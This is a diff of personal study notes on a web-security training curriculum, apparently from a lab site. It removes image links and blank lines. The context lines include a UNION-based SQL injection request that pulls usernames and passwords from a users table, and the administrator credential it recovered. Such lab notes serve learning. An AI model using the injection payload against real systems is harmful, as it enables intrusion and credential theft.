@@ -3,25 +3,13 @@ Server-side topics
 
 For complete beginners, we recommend starting with our server-side topics. These vulnerabilities are typically easier to learn because you only need to understand what's happening on the server. Our materials and labs will help you develop some of the core knowledge and skills that you will rely on time after time.
 
-
-![[Pasted image 20221204102318.png]]
-
-
 Client-side topics
 
 Client-side vulnerabilities introduce an additional layer of complexity, which can make them slightly more challenging. These materials and labs will help you build on the server-side skills you've already learned and teach you how to identify and exploit some gnarly client-side vectors as well.
 
-
-![[Pasted image 20221204102412.png]]
-
-
 Advanced topics
 
 These topics aren't necessarily more difficult to master but they generally require deeper understanding and a wider breadth of knowledge. We recommend getting to grips with the basics before tackling these labs, some of which are based on pioneering techniques discovered by our world-class research team.
-
-
-![[Pasted image 20221204102529.png]]
-
 
 ```
 Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
@@ -132,13 +120,5 @@ GET /filter?category=Pets'+UNION+SELECT+NULL,username||':'||password+FROM+users-
 found: administrator:usx6y3m2l5zw3n274zgv
 login
 
-
-
 ```
-
-
-
-
-
-
 
